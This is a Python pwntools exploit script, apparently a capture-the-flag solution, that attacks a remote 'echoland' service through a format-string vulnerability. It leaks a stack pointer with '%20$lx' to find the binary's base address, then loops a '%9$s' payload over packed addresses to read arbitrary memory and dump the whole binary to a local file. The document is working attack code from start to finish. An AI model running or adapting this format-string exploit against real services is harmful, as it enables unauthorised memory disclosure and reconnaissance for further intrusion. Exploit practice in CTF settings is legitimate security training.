#!/usr/bin/env python3

from pwn import *


def get_process():
    if len(sys.argv) < 2:
        log.error(f'Usage {sys.argv[0]} <ip>:<port>')

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def dump(p, i: int) -> bytes:
    p.sendlineafter(b'> ', f'%{i}$lx'.encode())
    return p.recvline().strip()


def main():
    p = get_process()

    main_position = 20
    main_offset = 0x1160

    main_addr = int(dump(p, main_position).decode(), 16)
    elf_addr = main_addr - main_offset
    log.info(f'Binary base address: {hex(elf_addr)}')

    offset = 0

    with open('echoland_dump', 'ab') as f:
        while True:
            addr = elf_addr + offset

            if b'n' in p64(addr):
                f.write(b'\0')
                offset += 1
                continue

            try:
                p.sendlineafter(b'> ', b'%9$s....' + p64(addr))
                data = p.recvuntil(b'1. Scream.').split(b'....')[0] + b'\0'
                log.info(f'Dumping address: {hex(addr)} => {data}')
                f.write(data)
                offset += len(data)
            except (EOFError, KeyboardInterrupt):
                log.success('Finished')
                break


if __name__ == '__main__':
    main()
